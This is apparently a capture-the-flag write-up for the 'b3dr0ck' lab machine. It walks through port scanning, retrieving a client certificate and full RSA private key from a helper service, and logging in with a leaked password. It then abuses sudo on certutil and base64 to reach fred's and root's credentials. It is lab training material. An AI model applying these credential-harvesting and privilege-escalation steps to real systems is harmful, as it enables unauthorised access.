@@ -1,0 +1,417 @@
+### b3dr0ck
+
+## Initial Hints
+
+Barney is setting up the ABC webserver, and trying to use TLS certs to secure connections, but he's having trouble. Here's what we know...
+
+- He was able to establish nginx on port 80,  redirecting to a custom TLS webserver on port 4040
+- There is a TCP socket listening with a simple service to help retrieve TLS credential files (client key & certificate)
+- There is another TCP (TLS) helper service listening for authorized connections using files obtained from the above service
+- Can you find all the Easter eggs?
+
+## Nmap Enumeration
+
+### Enumerate all ports 
+
+```
+# Nmap 7.92 scan initiated Sun Sep 25 12:07:36 2022 as: nmap -Pn -p- -oN target_ports 10.10.96.172
+Nmap scan report for 10.10.96.172
+Host is up (0.068s latency).
+Not shown: 65530 closed tcp ports (reset)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+4040/tcp  open  yo-main
+9009/tcp  open  pichat
+54321/tcp open  unknown
+
+# Nmap done at Sun Sep 25 12:09:07 2022 -- 1 IP address (1 host up) scanned in 90.98 seconds
+```
+
+### Enumerate the ports we found for details
+
+```
+PORT      STATE SERVICE      VERSION                                                                                
+22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)                           
+| ssh-hostkey:                                                                                                      
+|   3072 1a:c7:00:71:b6:65:f5:82:d8:24:80:72:48:ad:99:6e (RSA)                                                      
+|   256 3a:b5:25:2e:ea:2b:44:58:24:55:ef:82:ce:e0:ba:eb (ECDSA)                                                     
+|_  256 cf:10:02:8e:96:d3:24:ad:ae:7d:d1:5a:0d:c4:86:ac (ED25519)                                                   
+80/tcp    open  http         nginx 1.18.0 (Ubuntu)                                                                  
+|_http-server-header: nginx/1.18.0 (Ubuntu)                                                                         
+|_http-title: Did not follow redirect to https://10.10.96.172:4040/          
+4040/tcp  open  ssl/yo-main?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Content-type: text/html
+|     Date: Sun, 25 Sep 2022 16:24:28 GMT
+|     Connection: close
+|     <!DOCTYPE html>
+|     <html>
+|     <head>
+|     <title>ABC</title>
+|     <style>
+|     body {
+|     width: 35em;
+|     margin: 0 auto;
+|     font-family: Tahoma, Verdana, Arial, sans-serif;
+|     </style>
+|     </head>
+|     <body>
+|     <h1>Welcome to ABC!</h1>
+|     <p>Abbadabba Broadcasting Compandy</p>
+|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
+|     <p>Barney is helping to setup the server, and he said this info was important...</p>
+|     <pre>
+|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
+|     Bamm Bamm tried to setup a sql database, but I don't see it running.
+|     Looks like it started something else, but I'm not sure how to turn it off...
+|     said it was from the toilet and OVER 9000!
+|     Need to try and secure
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Content-type: text/html
+|     Date: Sun, 25 Sep 2022 16:24:29 GMT
+|     Connection: close
+|     <!DOCTYPE html>
+|     <html>
+|     <head>
+|     <title>ABC</title>
+|     <style>
+|     body {
+|     width: 35em;
+|     margin: 0 auto;
+|     font-family: Tahoma, Verdana, Arial, sans-serif;
+|     </style>
+|     </head>
+|     <body>
+|     <h1>Welcome to ABC!</h1>
+|     <p>Abbadabba Broadcasting Compandy</p>
+|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
+|     <p>Barney is helping to setup the server, and he said this info was important...</p>
+|     <pre>
+|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
+|     Bamm Bamm tried to setup a sql database, but I don't see it running.
+|     Looks like it started something else, but I'm not sure how to turn it off...
+|     said it was from the toilet and OVER 9000!
+|_    Need to try and secure
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2022-09-25T16:16:38
+|_Not valid after:  2023-09-25T16:16:38
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+9009/tcp  open  pichat?
+| fingerprint-strings: 
+|   NULL: 
+|     ____ _____ 
+|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
+|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
+|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| | 
+|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
+|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
+|_    What are you looking for?
+54321/tcp open  ssl/unknown
+| fingerprint-strings: 
+|   LDAPSearchReq, afp: 
+|_    Error: 'undefined' is not authorized for access.
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2022-09-25T16:16:38
+|_Not valid after:  2023-09-25T16:16:38
+
+```
+
+## Ports 80 and 4040 Enumeration:
+
+
+<image here from browser>
+
+
+Cant use gobuster because:
+```
+Error: error on running gobuster: unable to connect to https://10.10.96.172:4040/: invalid certificate: x509: cannot validate certificate for 10.10.96.172 because it doesn't contain any IP SANs
+```
+
+## Port 9009 Enumeration
+
+Since its a strange service i tried to search for exploit or vulnerabilities but I found nothing so I started by using telnet to try and obtain mroe information:
+
+```
+telnet 10.10.96.172 9009
+Trying 10.10.96.172...
+Connected to 10.10.96.172.
+Escape character is '^]'.
+
+
+ __          __  _                            _                   ____   _____ 
+ \ \        / / | |                          | |            /\   |  _ \ / ____|
+  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
+   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |     
+    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
+     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
+                                                                               
+                                                                               
+
+
+What are you looking for? certifate
+Sounds like you forgot your certificate. Let's find it for you...
+
+-----BEGIN CERTIFICATE-----
+MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
+dDAeFw0yMjA5MjUxNjE3MTRaFw0yMzA5MjUxNjE3MTRaMBgxFjAUBgNVBAMMDUJh
+cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC0Z5Q8
+WvYEqLeph/nh28lEpsJTxWh6R1FOJTkgVjxNMQG35aW4FHx/SLJNll60nixg+Thf
+veh9dT1QKX9Hs2yfudVDwsTgbOxkDzXegt9Ha17lJra6SDmMrd1GXKci0yXS310e
+fuMi+wtqW89GXj6MNO/AC/qcq0w5My6Wdv7XbJnYaez6WGTaTVqlbjop2M0HNBI1
+TjDULnneqvcBpMIP6bXHzoLyh1lSOwtT8Lm7vfnmNggsGNhhnRWRE3JxIeUYnfAC
+NndB8R3dcySWa0ilRujic9SduX9EBC3gQBc0nNM1/p31UEVdiAKx2wz7JBkGBmRx
+PlwKVm+3aqHLzsoDAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAGq+h2QesZL/+JLU
+bYunNB1Uo6luHvQMLlsTuTSNQsWKzicBv3u+T+8cxu1L9UNql2on00yQuqq6KzOh
+QLi+mc+Fft1u7l6wBzXvcqXqSKq7HfvUzvHRlMzi00icyiav+KpuBy3KsCiCeEFR
+mGHBYH0WIKrO+oAFu2+eFptAD8JPWhAplGuBKVsT/QQ2QANLrtZKVz2QYHeb6IVB
+JyZjH6xiEreP0wF2DTNUOlUWzd5m6db0JRueHCAy4826Avt/qu66FchvC282fH31
+HCkEHWWACh67spmXprowWbPPtHhAYD7Ua6r3Bw0JmLF94TJWTRSiw7QsPEzNDHRp
+ILBGj50=
+-----END CERTIFICATE-----
+
+What are you looking for? key
+Sounds like you forgot your private key. Let's find it for you...
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAtGeUPFr2BKi3qYf54dvJRKbCU8VoekdRTiU5IFY8TTEBt+Wl
+uBR8f0iyTZZetJ4sYPk4X73ofXU9UCl/R7Nsn7nVQ8LE4GzsZA813oLfR2te5Sa2
+ukg5jK3dRlynItMl0t9dHn7jIvsLalvPRl4+jDTvwAv6nKtMOTMulnb+12yZ2Gns
++lhk2k1apW46KdjNBzQSNU4w1C553qr3AaTCD+m1x86C8odZUjsLU/C5u7355jYI
+LBjYYZ0VkRNycSHlGJ3wAjZ3QfEd3XMklmtIpUbo4nPUnbl/RAQt4EAXNJzTNf6d
+9VBFXYgCsdsM+yQZBgZkcT5cClZvt2qhy87KAwIDAQABAoIBAHT8HfItgg9vYPn8
+hRvjLFbqVGWCQ8fXa2/jT3IauavMtbKMprQCBOF9QLJzaiJx15Fiyx26xoJkfkf3
+QOQ8A5poJVV1fbmSqJASFPqfny5u//BU9HVD1J3XOQAhoPhCN+rQkU/vNFdAuBxW
+QMj+4EyHH1lH61Gg+yK0f+dubr8+RKRUPkGLdl8Ix3TmUbtMPzdIaCQAhGWXuz/s
+m+QxrFfoO9WZm98C5vxlwm6RYQURXZ+zLRFk8sozgyfZH5VlSLM0ykcwGO0bMjzn
++2YYQkXl7VNi5akBzNlqeecA2Oi7Ip8eeRukIzLh0q1I0DXMklF9JWpdGmz/OEim
+pZoAkFECgYEA2FT/rSGHCswNnJoDpSs3f7t6RGQvGmVLeWdhXBbmFVgr/LqbeviA
+ngoDilK6dqjwQYaBUzcv6gAGrHDioS2pS12EYkjINLDhzuLXVD/ueBxTcvli2KpD
+3b/pBHGDJmnnO82ZTKR6qf60ra3ddLsuQxqE8oZsyqCX9IIRmiTLvI8CgYEA1XwV
+shV0hnv74Ahq9rcafGSO5+XEYO9coSvbsh2pJHABjXPDni7HN2zQIVtOJJQGK9T1
+6oFDvrzrNKmFGBB34IgkNPINYma5RLCM8flvCrxw/U5G8G8enJ4Md8T1WR1hP/oF
+WEpnz9TpAihLDU0G+otbVTkHWAeVB5y5DEZXPU0CgYA803FsQaARxhwRqzBZMZSS
+Qql3L2AbIN4ezZWPahTZbYg4sFNlORgY16H1M5ugH5ImKmaUelDrj4RQ2hCu1wLh
+4PKHHAXG4vEq1ZdL5gnsFbLVAg/r8bvRTtN631vL4j0VEJMI/LpMsAQnTVqWJsc0
+MPGuq2NNeegf5K6EU9JBOwKBgQDEv3IDSPC2TKeqJjfmHoQjZk2p/MDKkW7t/syf
+z+Qld7CGm80KCJSDSR5bz5kp7t3tIXxuXimALP4b76uArRS98tpjjTy2lnNikc+j
+5jznSRpc6PpJ9i7hKmvVKcjwEzqgSp0IbLJWASOpYFci7/1hhHNtDHzvLTW06URF
+wsH99QKBgFQbT8YgW+R4dnr03mO1NkSdvDHRjvFb/8e63N9tMujIK3PTQiB2Pi+/
+XOPU1IIXvjhTuuUog5m3G0hAk4SAZd/aUfry/Fp98aT8KMa2WBK4kwyNz6OpNSG4
+HxSnbFAM5SHAVX52S6emzbIgIO0jk478oiRyCn1jIKdEoFDzYmfp
+-----END RSA PRIVATE KEY-----
+```
+
+In a matter of minutes we get an certificate and key.
+I think that we cant do anything more besides obtaining this two pieces of information.
+
+## Port 54321
+
+Since we cant do nothing more in the other ports we then try to obtain as much information as we can about this port.
+Nmap gave us the information below:
+```
+54321/tcp open  ssl/unknown
+| fingerprint-strings: 
+|   LDAPSearchReq, afp: 
+|_    Error: 'undefined' is not authorized for access.
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2022-09-25T16:16:38
+|_Not valid after:  2023-09-25T16:16:38
+```
+It seems like a service that is expecting some form of authentication.
+
+Using the information we get from port 9009 we create two files:
+
+- client_cert.pem with the first certificate
+- client_key.pem with the second certificate
+
+Then download the certificate from the browser:
+
+- localhost.pem
+
+Then put all together with the command:
+```
+openssl s_client -cert client_cert.pem -key client_key.pem -CAfile localhost.pem -connect 10.10.96.172:54321
+```
+
+We then gain a shell:
+```
+Welcome: 'Barney Rubble' is authorized.
+b3dr0ck> 
+
+b3dr0ck> help
+Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
+```
+The only thing we can obtain is a "password hint".
+Trying to search that hash on the google we dont find anything.
+So we try to login in ssh against the users: 'Barney Rubble', 'Barney' and 'barney'
+And then we get a shell as barney, this password was in fact a plaintext password.
+
+We get the barney.txt ate /home/barney
+
+## Machine Enumaration
+
+We turn on linpeas and we got the following interesting results:
+
+```
+╔══════════╣ SUID - Check easy privesc, exploits and write perms                                                                                                                    
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                    
+strings Not Found                                                                                                                                                                   
+-rwsr-xr-x 1 root root 121K Apr  8 19:36 /snap/snapd/15534/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                 
+-rwsr-xr-x 1 root root 121K Mar  3  2022 /snap/snapd/15177/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                 
+-rwsr-xr-x 1 root root 84K Jul 14  2021 /snap/core20/1405/usr/bin/chfn  --->  SuSE_9.3/10                                                                                           
+-rwsr-xr-x 1 root root 52K Jul 14  2021 /snap/core20/1405/usr/bin/chsh                                                                                                              
+-rwsr-xr-x 1 root root 87K Jul 14  2021 /snap/core20/1405/usr/bin/gpasswd                                                                                                           
+-rwsr-xr-x 1 root root 55K Feb  7  2022 /snap/core20/1405/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                        
+-rwsr-xr-x 1 root root 44K Jul 14  2021 /snap/core20/1405/usr/bin/newgrp  --->  HP-UX_10.20                                                                                         
+-rwsr-xr-x 1 root root 67K Jul 14  2021 /snap/core20/1405/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)             
+-rwsr-xr-x 1 root root 67K Feb  7  2022 /snap/core20/1405/usr/bin/su                                                                                                                
+-rwsr-xr-x 1 root root 163K Jan 19  2021 /snap/core20/1405/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                              
+-rwsr-xr-x 1 root root 39K Feb  7  2022 /snap/core20/1405/usr/bin/umount  --->  BSD/Linux(08-1996)                                                                                  
+-rwsr-xr-- 1 root systemd-resolve 51K Jun 11  2020 /snap/core20/1405/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                     
+-rwsr-xr-x 1 root root 463K Dec  2  2021 /snap/core20/1405/usr/lib/openssh/ssh-keysign                                                                                              
+-rwsr-xr-x 1 root root 84K Jul 14  2021 /snap/core20/1434/usr/bin/chfn  --->  SuSE_9.3/10                                                                                           
+-rwsr-xr-x 1 root root 52K Jul 14  2021 /snap/core20/1434/usr/bin/chsh                                                                                                              
+-rwsr-xr-x 1 root root 87K Jul 14  2021 /snap/core20/1434/usr/bin/gpasswd                                                                                                           
+-rwsr-xr-x 1 root root 55K Feb  7  2022 /snap/core20/1434/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                        
+-rwsr-xr-x 1 root root 44K Jul 14  2021 /snap/core20/1434/usr/bin/newgrp  --->  HP-UX_10.20                                                                                         
+-rwsr-xr-x 1 root root 67K Jul 14  2021 /snap/core20/1434/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)             
+-rwsr-xr-x 1 root root 67K Feb  7  2022 /snap/core20/1434/usr/bin/su                                                                                                                
+-rwsr-xr-x 1 root root 163K Jan 19  2021 /snap/core20/1434/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                              
+-rwsr-xr-x 1 root root 39K Feb  7  2022 /snap/core20/1434/usr/bin/umount  --->  BSD/Linux(08-1996)                                                                                  
+-rwsr-xr-- 1 root systemd-resolve 51K Jun 11  2020 /snap/core20/1434/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                     
+-rwsr-xr-x 1 root root 463K Dec  2  2021 /snap/core20/1434/usr/lib/openssh/ssh-keysign                                                                                              
+-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device                                                                                                           
+-rwsr-xr-- 1 root messagebus 51K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                           
+-rwsr-xr-x 1 root root 23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1                                                                                                  
+-rwsr-xr-x 1 root root 140K Feb 23  2022 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                                  
+-rwsr-xr-x 1 root root 463K Dec  2  2021 /usr/lib/openssh/ssh-keysign                                                                                                               
+-rwsr-xr-x 1 root root 52K Jul 14  2021 /usr/bin/chsh                                                                                                                               
+-rwsr-xr-x 1 root root 39K Feb  7  2022 /usr/bin/umount  --->  BSD/Linux(08-1996)                                                                                                   
+-rwsr-xr-x 1 root root 31K Feb 21  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)                                                            
+-rwsr-xr-x 1 root root 87K Jul 14  2021 /usr/bin/gpasswd                                                                                                                            
+-rwsr-xr-x 1 root root 44K Jul 14  2021 /usr/bin/newgrp  --->  HP-UX_10.20                                                                                                          
+-rwsr-xr-x 1 root root 67K Jul 14  2021 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                              
+-rwsr-xr-x 1 root root 55K Feb  7  2022 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                         
+-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount                                                                                                                         
+-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)                         
+
+
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d                                                                                                                   
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                    
+Matching Defaults entries for barney on b3dr0ck:                                                                                                                                    
+    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                      
+                                                                                                                                                                                    
+User barney may run the following commands on b3dr0ck:                                                                                                                              
+    (ALL : ALL) /usr/bin/certutil    
+
+                                                                                                                                                                                    
+Potentially Vulnerable to CVE-2022-2588                                                                                                                                             
+Vulnerable to CVE-2021-3560
+
+Sudo version 1.8.31  
+```
+
+By looking at /etc/passwd we see that we got two users:
+```
+fred:x:1000:1000:Fred Flintstone:/home/fred:/bin/bash
+barney:x:1001:1001:Barney Rubble,,,:/home/barney:/bin/bash
+```
+Using the permission that we have to use certutil we can see the certificates:
+```
+barney@b3dr0ck:/home/fred# certutil ls
+
+Current Cert List: (/usr/share/abc/certs)
+------------------
+total 72
+drwxrwxr-x 2 root root 4096 Sep 25 17:19 .
+drwxrwxr-x 8 root root 4096 Apr 29 04:30 ..
+-rw-r----- 1 root root  972 Sep 25 16:17 barney.certificate.pem
+-rw-r----- 1 root root 1674 Sep 25 16:17 barney.clientKey.pem
+-rw-r----- 1 root root  894 Sep 25 16:17 barney.csr.pem
+-rw-r----- 1 root root 1678 Sep 25 16:17 barney.serviceKey.pem
+-rw-r----- 1 root root  976 Sep 25 17:38 fred.certificate.pem
+-rw-r----- 1 root root 1674 Sep 25 17:38 fred.clientKey.pem
+-rw-r----- 1 root root  898 Sep 25 17:38 fred.csr.pem
+-rw-r----- 1 root root 1678 Sep 25 17:38 fred.serviceKey.pem
+
+barney@b3dr0ck:/home/fred# certutil 
+
+Cert Tool Usage:
+----------------
+
+Show current certs:
+  certutil ls
+
+Generate new keypair:
+  certutil [username] [fullname]
+```
+
+Using the following command we overwrite the fred certificates:
+
+```
+sudo certutil fred "Fred Flintstone"
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAupLgPWBk0c+9WBUFWlvt1Ts1FbV/OVXyKJL53wISIe6PYFtD
+aaV7rm4Bpgahlba/LmPrfbLVKc1QZIFb+gbWZbVR/DDPaji26iJ7pnTeEe8kvLkJ
+c8nW54UUcQIPBa9nqJrGeLL560jgovyaIs38ApV1Ip0j7XVQG2U+aVRWbcyJRg7r
+r6D9aGW0PZOVCdldWjjMMgIYhJ5GEm+hB9HQA7oV4huquGD0d/nO4Skkb/5J62An
+gfag9TthiSzsFW7fUU/cUA3Q4bZQIsQuJizTvJPmA8J4jhLhEJWqH+5eWkXqMOBa
+......
+-----END RSA PRIVATE KEY-----
+
+-----BEGIN CERTIFICATE-----
+MIICozCCAYsCAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
+dDAeFw0yMjA5MjUxNzM4MzdaFw0yMjA5MjYxNzM4MzdaMBoxGDAWBgNVBAMMD0Zy
+.....
+-----END CERTIFICATE-----
+
+```
+
+Then using the same way we authenticate via openssl we create two files for the fred certificate and key and then we login:
+``` 
+openssl s_client -cert fred_client_cert.pem -key fred_client_key.pem -CAfile localhost.pem -connect 10.10.96.172:54321
+
+Welcome: 'Fred Flintstone' is authorized.
+b3dr0ck> password
+Password hint: YabbaDabbaD0000! (user = 'Fred Flintstone')
+
+```
+
+We got FRED PASSWORD!!
+Login in ssh we get a shell as Fred
+
+```
+fred@b3dr0ck:~$ sudo -l
+Matching Defaults entries for fred on b3dr0ck:
+    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User fred may run the following commands on b3dr0ck:
+    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
+    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
+
+```
+
+We use sudo -l to see if we got anything and we got a way to see the /root/pass.txt.
+
+```
+fred@b3dr0ck:~$ sudo /usr/bin/base64 /root/pass.txt
+TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dOQkdYVVJUTEpaS0ZTU1lLCg==
+
+base64 -d 
+LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK
+```
+
+Using cyberchef with the hash below he automatically decodes into a new hash: a00a12aad6b7c16bf07032bd05a31d56
+Then using the hint, we go to crackstation and we got the root password
+We get the root password we got a shell as root.
+
+We can now see the root.txt.
